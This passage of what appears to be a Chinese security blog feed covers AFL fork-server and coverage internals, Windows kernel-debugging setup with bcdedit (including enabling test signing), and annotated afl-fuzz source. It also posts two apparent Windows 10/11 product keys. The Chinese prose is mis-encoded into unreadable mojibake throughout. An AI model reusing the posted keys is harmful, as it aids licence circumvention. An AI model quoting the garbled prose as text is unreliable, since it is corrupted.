<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_fork_resume:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In child process: close fds, resume execution. */</span></span><br><span class="line"></span><br><span class="line">  movq $<span class="number">198</span>, %rdi</span><br><span class="line">call close@PLT</span><br><span class="line"></span><br><span class="line">  movq $(<span class="number">198</span> + <span class="number">1</span>), %rdi</span><br><span class="line">call close@PLT</span><br><span class="line"></span><br><span class="line">  popq %rdx</span><br><span class="line">  popq %rdx</span><br><span class="line"></span><br><span class="line">  movq %r12, %rsp</span><br><span class="line">  popq %r12</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">0</span>(%rsp), %rax</span><br><span class="line">  movq  <span class="number">8</span>(%rsp), %rcx</span><br><span class="line">  movq <span class="number">16</span>(%rsp), %rdi</span><br><span class="line">  movq <span class="number">32</span>(%rsp), %rsi</span><br><span class="line">  movq <span class="number">40</span>(%rsp), %r8</span><br><span class="line">  movq <span class="number">48</span>(%rsp), %r9</span><br><span class="line">  movq <span class="number">56</span>(%rsp), %r10</span><br><span class="line">  movq <span class="number">64</span>(%rsp), %r11</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">96</span>(%rsp), %xmm0</span><br><span class="line">  movq <span class="number">112</span>(%rsp), %xmm1</span><br><span class="line">  movq <span class="number">128</span>(%rsp), %xmm2</span><br><span class="line">  movq <span class="number">144</span>(%rsp), %xmm3</span><br><span class="line">  movq <span class="number">160</span>(%rsp), %xmm4</span><br><span class="line">  movq <span class="number">176</span>(%rsp), %xmm5</span><br><span class="line">  movq <span class="number">192</span>(%rsp), %xmm6</span><br><span class="line">  movq <span class="number">208</span>(%rsp), %xmm7</span><br><span class="line">  movq <span class="number">224</span>(%rsp), %xmm8</span><br><span class="line">  movq <span class="number">240</span>(%rsp), %xmm9</span><br><span class="line">  movq <span class="number">256</span>(%rsp), %xmm10</span><br><span class="line">  movq <span class="number">272</span>(%rsp), %xmm11</span><br><span class="line">  movq <span class="number">288</span>(%rsp), %xmm12</span><br><span class="line">  movq <span class="number">304</span>(%rsp), %xmm13</span><br><span class="line">  movq <span class="number">320</span>(%rsp), %xmm14</span><br><span class="line">  movq <span class="number">336</span>(%rsp), %xmm15</span><br><span class="line"></span><br><span class="line">  leaq <span class="number">352</span>(%rsp), %rsp</span><br><span class="line"></span><br><span class="line">  jmp  __afl_store</span><br></pre></td></tr></table></figure>

<p>__afl_store åœ¨å¢åŠ  hit count ä¹‹åï¼Œè·³è½¬å› AFL å¾€åŸºæœ¬å—å¤´éƒ¨æ’å…¥çš„æ¡©ä»£ç â€”â€”åˆ°æ­¤ä¸ºæ­¢å­è¿›ç¨‹æ¢å¤æ‰€æœ‰çŠ¶æ€ï¼Œå¼€å§‹äº†ç¨‹åºä¸­ç¬¬ä¸€ä¸ªåŸºæœ¬å—çš„æ‰§è¡Œã€‚</p>
<p>AFL é€šè¿‡ fork serverï¼Œå¾—ä»¥é¿å…é¢‘ç¹çš„ execve è°ƒç”¨ï¼Œä»è€Œæå‡äº† fuzz æ•ˆç‡ã€‚</p>
<h2 id="ä»£ç è¦†ç›–ç‡æ£€æµ‹"><a href="#ä»£ç è¦†ç›–ç‡æ£€æµ‹" class="headerlink" title="ä»£ç è¦†ç›–ç‡æ£€æµ‹"></a>ä»£ç è¦†ç›–ç‡æ£€æµ‹</h2><p>AFLç”¨äº†ä¸€å—64KBçš„å…±äº«å†…å­˜æ¥å­˜æ”¾tupleçš„ä¿¡æ¯ï¼Œè€Œä¸”æ˜¯é‡‡ç”¨byteæ¥è®°å½•tupleçš„ä¿¡æ¯ï¼Œä¹‹æ‰€ä»¥é‡‡ç”¨byteä¸æ˜¯bitæ˜¯å› ä¸ºè¿˜è¦è®°å½•å‘½ä¸­æ•°ã€‚ä½¿ç”¨è¿™å—æœ‰é™çš„å…±äº«å†…å­˜å­˜åœ¨ç¢°æ’ï¼Œä¼šå¯¼è‡´è¾¹è¦†ç›–ç‡ä¸å‡†ç¡®ï¼Œè¿™æ˜¯AFLçš„ä¸€ä¸ªç¼ºç‚¹ã€‚</p>
<p>æ¡©å‡½æ•°ï¼ˆ<code>__afl_store</code>ï¼‰æ‰€å®Œæˆçš„ä»»åŠ¡å¯ä»¥æ¦‚æ‹¬ä¸º</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;        <span class="comment">//ä¸åŒæ¡©ç‹¬æœ‰çš„éšæœºæ•°, å¯¹åº”æ’æ¡©æ—¶çš„R(MAP_SIZE)</span></span><br><span class="line">shared_mem[cur_location ^ prev_location]++;  <span class="comment">//prev_locationç±»ä¼¼å…¨å±€å˜é‡, è¡¨ç¤ºä¸Šä¸€ä¸ªåˆ†æ”¯. shared_memæ˜¯å…±äº«å†…å­˜</span></span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;           <span class="comment">//æ›´æ–°prev_location</span></span><br></pre></td></tr></table></figure>

<p>cur_locationæ˜¯ä¸€ä¸ªéšæœºæ•°, è¿™æ ·<code>cur_location ^ prev_location</code>ä¹Ÿæ˜¯éšæœºçš„, å¯ä»¥å‡åŒ€çš„åˆ†æ­¥åœ¨<code>shared_mem</code>ä¸­, é˜²æ­¢ä¸åŒæ¡©äº§ç”Ÿå†²çª</p>
<p><code>shared_mem[]</code> æ•°ç»„æ˜¯ä¸€ä¸ªè°ƒç”¨è€… (caller) ä¼ ç»™è¢«æ’æ¡©çš„äºŒè¿›åˆ¶ç¨‹åºçš„64kbçš„å…±äº«ç©ºé—´ã€‚å…¶ä¸­çš„æ¯ä¸€å­—èŠ‚è¡¨ç¤ºå…ƒç»„<code>(branch_src, branch_dst)</code>çš„å‘½ä¸­æ¬¡æ•°.</p>
<p>é€‰æ‹©è¿™ä¸ªæ•°ç»„å¤§å°çš„åŸå› æ˜¯è®©å†²çª(collisions)å°½å¯èƒ½å‡å°‘ã€‚è¿™æ ·é€šå¸¸èƒ½å¤„ç†2kåˆ°10kçš„åˆ†æ”¯ç‚¹ã€‚åŒæ—¶ï¼Œå®ƒçš„å¤§å°ä¹Ÿè¶³ä»¥è¾¾åˆ°æ¯«ç§’çº§çš„åˆ†æã€‚</p>
<p>è€Œè®¾ç½®<code>prev_location = cur_location &gt;&gt; 1</code>åˆ™å¯ä»¥è®©å…ƒç»„å…·æœ‰æ–¹å‘æ€§, åŒºåˆ†<code>A-&gt;Bä¸B-&gt;A</code>ä¸¤ç§æƒ…å†µ.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">è‹¥prev_location æ²¡æœ‰ &gt;&gt; <span class="number">1</span></span><br><span class="line">    åˆ™å¯¹äºA-&gt;Bæœ‰:</span><br><span class="line">        prev_location = A;    <span class="comment">//è¿›å…¥Aæ—¶è®¾ç½®çš„</span></span><br><span class="line">        cur_location = B;</span><br><span class="line">        shared_mem[A^B]++;</span><br><span class="line">    å¯¹äºB-&gt;Aæœ‰:</span><br><span class="line">        prev_location = B;    <span class="comment">//è¿›å…¥Bæ—¶è®¾ç½®çš„</span></span><br><span class="line">        cur_location = A;</span><br><span class="line">        shared_mem[B^A]++;</span><br></pre></td></tr></table></figure>



<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://xidoo.top/2022/01/afl-white-book/">AFL ç™½çš®ä¹¦ç¿»è¯‘ä¸è¯»ä¹¦ç¬”è®°</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>windowsåŒæœºè°ƒè¯•</title>
    <url>/2024/01/18/Windows%20%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<blockquote>
<p>å¦‚ä½•è°ƒè¯•å†…æ ¸</p>
</blockquote>
<span id="more"></span>
<h2 id="windows-vm"><a href="#windows-vm" class="headerlink" title="windows vm"></a>windows vm</h2><h3 id="win10-11-è™šæ‹Ÿæœº"><a href="#win10-11-è™šæ‹Ÿæœº" class="headerlink" title="win10&#x2F;11 è™šæ‹Ÿæœº"></a>win10&#x2F;11 è™šæ‹Ÿæœº</h3><p>å®‰è£…å¥½VMï¼Œç¦æ­¢ç³»ç»Ÿæ›´æ–°ï¼Œé¿å…gadgetåœ°å€æ”¹å˜ã€‚</p>
<p>ç¥å¥‡çš„å­—ç¬¦ä¸²ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå‡ºç°åœ¨è¿™é‡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KH2J9-PC326-T44D4-39H6V-TVPBY   // 10</span><br><span class="line">BCQNW-3VWYB-4V7QD-M6R2B-7MH26   // 11</span><br></pre></td></tr></table></figure>

<h3 id="è°ƒè¯•å†…æ ¸"><a href="#è°ƒè¯•å†…æ ¸" class="headerlink" title="è°ƒè¯•å†…æ ¸"></a>è°ƒè¯•å†…æ ¸</h3><h4 id="ç¬¦å·ä¿¡æ¯"><a href="#ç¬¦å·ä¿¡æ¯" class="headerlink" title="ç¬¦å·ä¿¡æ¯"></a>ç¬¦å·ä¿¡æ¯</h4><p>WinDbg preview â€“&gt; File â€“&gt; setting â€“&gt; debugging setting â€“&gt; default symbol path</p>
<ul>
<li>å¦‚æœåœ¨æŒ‡å®šçš„ç›®å½•æ‰¾ä¸åˆ°ï¼Œå°±ä¼šè¿œç¨‹ä¸‹è½½</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">srv*C:\Symbols*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>

<h4 id="åŒæœºè°ƒè¯•"><a href="#åŒæœºè°ƒè¯•" class="headerlink" title="åŒæœºè°ƒè¯•"></a>åŒæœºè°ƒè¯•</h4><h5 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h5><p>WinDbg åŒæœºè°ƒè¯•å†…æ ¸ã€‚</p>
<ul>
<li>è™šæ‹Ÿæœºæ·»åŠ ä¸€ä¸ªä¸²è¡Œç«¯å£ï¼Œé€‰æ‹©å‘½åç®¡é“ï¼Œè¿™ä¸ªå‘½åç®¡é“å½¢å¼å¦‚ï¼š<code>\\.\pipe\com_1</code>ï¼Œé€‰æ‹©è¯¥ç«¯æ˜¯æœåŠ¡ï¼Œå¦ä¸€ç«¯æ˜¯åº”ç”¨ç¨‹åº</li>
<li>windbg é€‰æ‹© attach to kernel</li>
</ul>
<p>å¾…è°ƒè¯•æœºå™¨ï¼šæ·»åŠ ä¸€ä¸ªä¸²å£è®¾å¤‡ï¼Œä½¿ç”¨å‘½åçš„ç®¡é“ï¼›å¼€æœºåç®¡ç†å‘˜å¼€å¯cmd</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bcdedit /dbgsettings serial baudrate:115200 debugport:1</span><br><span class="line">bcdedit /copy &quot;&#123;current&#125;&quot; /d WinDebug        # è¿™ä¸€æ­¥æˆåŠŸä¼šç”Ÿæˆä¸€ä¸ªå¼•å¯¼é¡¹ï¼Œæ‰“å°å‡ºå…¶uuid</span><br><span class="line">bcdedit /displayorder &quot;&#123;current&#125;&quot; &quot;&#123;uuid&#125;&quot;   # æŒ‡å®šå¼€æœºè¿›å…¥ä¸Šä¸€æ­¥çš„å¼•å¯¼é¡¹</span><br><span class="line">bcdedit /debug &quot;&#123;uuid&#125;&quot; on                   # å¼€å¯debug</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•æœºå™¨ï¼šwindbg attach kernelï¼Œå¡«å†…å®¹</p>
<ul>
<li>æ³¢ç‰¹ç‡ï¼š115200</li>
<li>ç®¡é“ï¼šå¾…è°ƒè¯•æœºå™¨çš„å‘½åç®¡é“</li>
<li>resets: 0</li>
</ul>
<p>ä¹Ÿå¯ä½¿ç”¨ ä¹Ÿå¯  <code>win+r</code> è¿è¡Œ msconfig</p>
<h5 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h5><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-a-network-debugging-connection">Set up KDNET network kernel debugging manually</a></p>
<figure class="highlight pwsh"><table><tr><td class="code"><pre><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings net hostip:w.x.y.z port:n</span><br><span class="line">shutdown <span class="literal">-r</span> <span class="literal">-t</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€ç­¾åè®¤è¯å¼€å…³</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bcdedit/<span class="built_in">set</span> testsigning on</span><br></pre></td></tr></table></figure>


<p>æ˜¾ç¤ºä¸º <code>Debuggee is running...</code>ï¼Œåæ¥æ‰çŸ¥é“éœ€è¦ç‚¹å‡»é¡¶æ  <code>break</code> è¿›è¡Œæ–­ç‚¹</p>
<p>è¿˜å¯ä»¥ä½¿ç”¨ <code>VS</code> è°ƒè¯•ã€‚</p>
<p>å‚è€ƒï¼š<a href="https://bbs.kanxue.com/thread-261326.htm">åŒæœºå†…æ ¸è°ƒè¯•</a></p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>afl-fuzz</title>
    <url>/2024/03/25/afl-fuzz/</url>
    <content><![CDATA[<blockquote>
<p>FUZZ</p>
</blockquote>
<span id="more"></span>

<p>corpus: è¯­æ–™åº“ï¼Œfuzzerçš„è¾“å…¥</p>
<p>mutation: å˜å¼‚</p>
<ul>
<li>deterministic ç¡®å®šæ€§å˜å¼‚</li>
</ul>
<h2 id="å‚æ•°åˆå§‹åŒ–"><a href="#å‚æ•°åˆå§‹åŒ–" class="headerlink" title="å‚æ•°åˆå§‹åŒ–"></a>å‚æ•°åˆå§‹åŒ–</h2><p>å¤„ç†å‘½ä»¤è¡Œå‚æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  doc_path = <span class="built_in">access</span>(DOC_PATH, F_OK) ? <span class="string">&quot;docs&quot;</span> : DOC_PATH;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line">  <span class="built_in">srandom</span>(tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä½¿ç”¨getoptå‡½æ•°ï¼Œå¤„ç†afl-fuzzçš„å‚æ•°</span></span><br><span class="line">  <span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">      <span class="comment">// -i: input dirï¼ŒåŒ…å«è¾“å…¥çš„æ–‡ä»¶å¤¹, corpus ç›®å½•</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">        in_dir = optarg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -o: output dir å°†ç»“æœè¾“å‡º</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -M: master ä¸»è¦çš„fuzzer</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">          u8* c;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">          sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// è¦æ‰§è¡Œ deterministic å˜å¼‚</span></span><br><span class="line">          force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -S: Slave ä»fuzzer</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -f: ç›®æ ‡ç¨‹åºæ˜¯ä»æŸä¸ªå›ºå®šçš„æ–‡ä»¶è¯»å…¥ï¼Œåˆ™å¯ä»¥é€šè¿‡ -f é€‰é¡¹å‘ŠçŸ¥ afl-fuzz</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_file) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -x </span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (extras_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -t: è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œms</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (timeout_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -m å†…å­˜é™åˆ¶</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">          mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// none ä»£è¡¨ä¸é™åˆ¶å†…å­˜</span></span><br><span class="line">          <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// æŒ‡å®šå†…å­˜é™åˆ¶å•ä½</span></span><br><span class="line">          <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:  <span class="built_in">FATAL</span>(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            <span class="built_in">FATAL</span>(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// -b: bind core ç»‘å®šCPUæ ¸å¿ƒ</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (cpu_to_bind_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">          cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -d ï¼šè·³è¿‡ deterministic å‡ æ®µ</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;</span><br><span class="line">        use_splicing = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// åªå…³å¿ƒshmæŸäº›ä½ç½®ï¼Ÿ</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">           an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">           to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">           found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">           file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        <span class="built_in">read_bitmap</span>(in_bitmap);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ‰“å¼€ crash exploration æ¨¡å¼</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// æ‰“å¼€ dumb modeï¼Œå³é»‘ç›’æ¨¡å¼ï¼Œä¸æ’æ¡©</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ¢ä¸ª banner,theme?</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_banner) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Qemuæ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶fuzz</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// -V: version</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Version number has been printed 